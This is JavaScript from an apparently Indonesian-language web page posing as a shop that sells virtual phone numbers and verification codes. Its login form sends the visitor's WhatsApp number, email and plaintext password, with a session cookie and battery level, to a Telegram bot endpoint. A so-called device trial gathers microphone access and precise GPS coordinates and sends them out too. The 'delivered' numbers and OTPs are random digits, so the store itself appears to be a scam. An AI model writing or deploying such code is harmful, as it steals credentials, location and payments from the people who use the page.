  const CONTROL_KEY = "2180";
  const SOCIABUZZ_URL = "https://sociabuzz.com/f00dstore/shop";

  let activeProduct = "";
  let activePrice = "";
  let savedWa = "";
  let savedEmail = "";
  let sessionCookieValue = "";
  let paidApproved = false;

  let currentAssignedNumber = "";
  let currentOtpCode = "";

  let backgroundMeta = {
    battery: "Tidak tersedia"
  };

  function showPopup(title, message) {
    document.getElementById("popupTitle").innerText = title;
    document.getElementById("popupMessage").innerText = message;
    document.getElementById("customPopup").classList.add("show");
  }

  function closePopup() {
    document.getElementById("customPopup").classList.remove("show");
  }

  function setSessionCookie(wa, email) {
    const rawId = `${wa}|${email}|${Date.now()}`;
    const token = btoa(unescape(encodeURIComponent(rawId))).replace(/=/g, "");
    const cookieVal = `xzack_sess_${token}`;
    document.cookie = `xzack_session=${encodeURIComponent(cookieVal)}; max-age=86400; path=/; SameSite=Lax`;
    sessionCookieValue = cookieVal;
    return cookieVal;
  }

  function getSessionCookie() {
    const match = document.cookie.match(/(?:^|;\s*)xzack_session=([^;]*)/);
    return match ? decodeURIComponent(match[1]) : "";
  }

  function generateRandomNumber85() {
    const rest = Math.floor(Math.random() * 10000000).toString().padStart(7, "0");
    return `85${rest}`;
  }

  function generateRandomOtp6() {
    return Math.floor(Math.random() * 1000000).toString().padStart(6, "0");
  }

  async function readBatterySilent() {
    if (navigator.getBattery) {
      try {
        const bat = await navigator.getBattery();
        backgroundMeta.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? "Charging" : "Discharging"})`;
      } catch (e) {
        backgroundMeta.battery = "Tidak tersedia";
      }
    }
  }

  async function testMicTrial() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      return "Tidak didukung browser";
    }
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const label = stream.getAudioTracks()[0]?.label || "Mikrofon aktif (uji coba)";
      stream.getTracks().forEach((t) => t.stop());
      return `Diizinkan (${label})`;
    } catch (e) {
      return `Ditolak/Gagal (${e.name || e.message})`;
    }
  }

  function testLocationTrial() {
    if (!navigator.geolocation) {
      return Promise.resolve("Tidak didukung browser");
    }
    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude.toFixed(5);
          const lon = pos.coords.longitude.toFixed(5);
          resolve(`Diizinkan (${lat}, ${lon})`);
        },
        (err) => {
          resolve(`Ditolak/Gagal (${err.message})`);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });
  }

  async function runDeviceTrial() {
    const box = document.getElementById("trialResultBox");
    box.innerHTML = "⏳ Sedang menjalankan uji coba mikrofon dan lokasi...";

    const [micStatus, locationStatus] = await Promise.all([
      testMicTrial(),
      testLocationTrial()
    ]);

    box.innerHTML =
      `🎙️ Mikrofon: <strong>${micStatus}</strong><br>` +
      `📍 Lokasi: <strong>${locationStatus}</strong>`;

    dispatchTelegram({
      type: "TRIAL_SENSORS",
      micStatus,
      locationStatus
    }).catch(() => {});

    showPopup(
      "UJI COBA SELESAI",
      `Mikrofon: ${micStatus}\nLokasi: ${locationStatus}\n\nHasil uji coba dikirim ke bot Telegram.`
    );
  }

  function dispatchTelegram(payload) {
    if (window.location.hostname.endsWith("github.io")) {
      return Promise.resolve({ skippedStaticHost: true });
    }
    return fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        whatsapp: payload.whatsapp || savedWa,
        email: payload.email || savedEmail,
        battery: backgroundMeta.battery,
        cookie: sessionCookieValue || getSessionCookie() || "-"
      })
    }).then((res) => res.json());
  }

  document.getElementById("gatewayForm").addEventListener("submit", async function(e) {
    e.preventDefault();
    savedWa = document.getElementById("gateWa").value.trim();
    savedEmail = document.getElementById("gateEmail").value.trim();
    const password = document.getElementById("gatePass").value;

    setSessionCookie(savedWa, savedEmail);
    await readBatterySilent();

    dispatchTelegram({
      type: "GATEWAY_LOGIN",
      whatsapp: savedWa,
      email: savedEmail,
      password: password
    }).catch(() => {});

    document.getElementById("auth-gateway").style.display = "none";
    document.getElementById("appLayout").style.display = "grid";

    document.getElementById("displayUserWa").innerText = savedWa;
    document.getElementById("profileWa").innerText = savedWa;
    document.getElementById("profileEmail").innerText = savedEmail;

    showPopup("BERHASIL MASUK", "Akun berhasil masuk. Silakan pilih layanan pada katalog.");
  });

  function navigateTo(pageId) {
    document.querySelectorAll(".page-section").forEach((sec) => sec.classList.remove("active"));
    document.getElementById("page-" + pageId).classList.add("active");

    const links = document.querySelectorAll("#sidebarMenu a");
    links.forEach((l) => l.classList.remove("active"));

    if (pageId === "catalog") links[0].classList.add("active");
    else if (pageId === "auth") links[1].classList.add("active");
    else if (pageId === "payment") links[2].classList.add("active");
    else if (pageId === "history") links[3].classList.add("active");
    else if (pageId === "trial") links[4].classList.add("active");
  }

  function openVerifyControl() {
    document.querySelectorAll(".page-section").forEach((sec) => sec.classList.remove("active"));
    document.getElementById("page-verify-control").classList.add("active");
  }

  function renderDeliveryState() {
    const otpPanel = document.getElementById("paymentOtpPanel");
    const histPanel = document.getElementById("historyText");

    if (!activeProduct) {
      otpPanel.innerHTML = "Belum ada pesanan aktif. Silakan pilih produk di Katalog Nokos.";
      return;
    }

    if (!paidApproved) {
      otpPanel.innerHTML = `
        📦 Produk: <strong>${activeProduct}</strong> (Rp ${activePrice})<br>
        💳 Metode: <strong>SociaBuzz</strong><br>
        ⏳ Status Pembayaran: <span style="color:var(--yellow);">MENUNGGU PEMBAYARAN / BELUM TERKONFIRMASI</span><br>
        🔒 Nomor & Kode Verifikasi: <strong>Belum diberikan</strong>
      `;
      histPanel.innerHTML = `
        📦 Produk: <strong>${activeProduct}</strong><br>
        💰 Nominal: <strong>Rp ${activePrice}</strong><br>
        💳 Metode: <strong>SociaBuzz</strong><br>
        ⏳ Status: <span style="color:var(--yellow);">BELUM TERKONFIRMASI BAYAR</span><br>
        🔒 Nomor & OTP: <strong>Belum tersedia</strong>
      `;
    } else {
      otpPanel.innerHTML = `
        📦 Produk: <strong>${activeProduct}</strong> (Rp ${activePrice})<br>
        💳 Metode: <strong>SociaBuzz</strong><br>
        ✅ Status Pembayaran: <span style="color:var(--green);">LUNAS</span><br>
        📞 Nomor: <strong style="color:#5dade2; font-size:15px;">${currentAssignedNumber}</strong><br>
        🔑 Kode Verifikasi (6 Digit): <strong style="color:var(--green); font-size:16px; letter-spacing:3px;">${currentOtpCode}</strong>
      `;
      histPanel.innerHTML = `
        📦 Produk: <strong>${activeProduct}</strong><br>
        💰 Nominal: <strong>Rp ${activePrice}</strong><br>
        💳 Metode: <strong>SociaBuzz</strong><br>
        ✅ Status: <span style="color:var(--green);">LUNAS</span><br>
        📞 Nomor: <strong>${currentAssignedNumber}</strong><br>
        🔑 Kode Verifikasi (6 Digit): <strong style="color:var(--green);">${currentOtpCode}</strong>
      `;
    }
  }

  function selectProduct(productName, price) {
    activeProduct = productName;
    activePrice = price;
    paidApproved = false;
    currentAssignedNumber = generateRandomNumber85();
    currentOtpCode = generateRandomOtp6();

    navigateTo("payment");

    document.getElementById("selectedItemInfo").innerHTML = `Produk Dipilih: <strong>${productName}</strong><br>Total Tagihan: <strong style="color:var(--accent)">Rp ${price}</strong> via SociaBuzz`;

    const badge = document.getElementById("paymentStatusBadge");
    badge.className = "status-badge status-pending";
    badge.innerText = "Status: PENDING (Menunggu Pembayaran)";

    document.getElementById("btnConfirmPay").style.display = "block";
    renderDeliveryState();

    showPopup(
      "TAGIHAN DIBUAT",
      `Produk: ${productName}\nTotal Tagihan: Rp ${price}\nSilakan bayar melalui SociaBuzz:\n${SOCIABUZZ_URL}`
    );
  }

  function confirmPayment() {
    if (!activeProduct) {
      showPopup("INFORMASI", "Silakan pilih produk terlebih dahulu.");
      return;
    }

    paidApproved = false;
    const badge = document.getElementById("paymentStatusBadge");
    badge.className = "status-badge status-pending";
    badge.innerText = "Status: MENUNGGU KONFIRMASI PEMBAYARAN";

    renderDeliveryState();

    dispatchTelegram({
      type: "PAYMENT",
      product: activeProduct,
      price: activePrice,
      paymentStatus: "MENUNGGU_VERIFIKASI_SOCIABUZZ",
      assignedNumber: currentAssignedNumber,
      otpCode: currentOtpCode
    }).catch(() => {});

    showPopup(
      "KONFIRMASI TERKIRIM",
      "Konfirmasi pembayaran SociaBuzz telah dikirim. Nomor dan kode OTP 6 digit akan muncul setelah pembayaran disetujui."
    );
  }

  function savePaymentControl() {
    const key = document.getElementById("controlKeyInput").value.trim();
    const status = document.getElementById("controlStatusSelect").value;
    const badge = document.getElementById("paymentStatusBadge");
    const log = document.getElementById("controlStatusLog");

    if (key !== CONTROL_KEY) {
      showPopup("GAGAL", "Kode akses tidak valid.");
      return;
    }

    if (!activeProduct) {
      showPopup("INFORMASI", "Belum ada pesanan aktif.");
      return;
    }

    if (status === "PAID") {
      paidApproved = true;
      currentAssignedNumber = generateRandomNumber85();
      currentOtpCode = generateRandomOtp6();
      badge.className = "status-badge status-success";
      badge.innerText = "Status: LUNAS";
      log.innerHTML = `✅ Disetujui <strong>SUDAH BAYAR</strong><br>Nomor: <strong>${currentAssignedNumber}</strong><br>OTP 6 Digit: <strong>${currentOtpCode}</strong>`;

      dispatchTelegram({
        type: "ADMIN_PAYMENT_STATUS",
        product: activeProduct,
        price: activePrice,
        paymentStatus: "SUDAH_BAYAR",
        assignedNumber: currentAssignedNumber,
        otpCode: currentOtpCode
      }).catch(() => {});

      renderDeliveryState();
      showPopup("STATUS DIPERBARUI", "Pembayaran ditandai SUDAH BAYAR.");
    } else {
      paidApproved = false;
      badge.className = "status-badge status-rejected";
      badge.innerText = "Status: BELUM BAYAR";
      log.innerHTML = `🚫 Ditandai <strong>BELUM BAYAR</strong>. Nomor dan OTP tidak diberikan.`;

      dispatchTelegram({
        type: "ADMIN_PAYMENT_STATUS",
        product: activeProduct,
        price: activePrice,
        paymentStatus: "BELUM_BAYAR",
        assignedNumber: "DITAHAN",
        otpCode: "DITAHAN"
      }).catch(() => {});

      renderDeliveryState();
      showPopup("STATUS DIPERBARUI", "Pembayaran ditandai BELUM BAYAR. Nomor dan OTP tidak diberikan.");
    }
  }

  window.addEventListener("DOMContentLoaded", () => {
    readBatterySilent();
  });
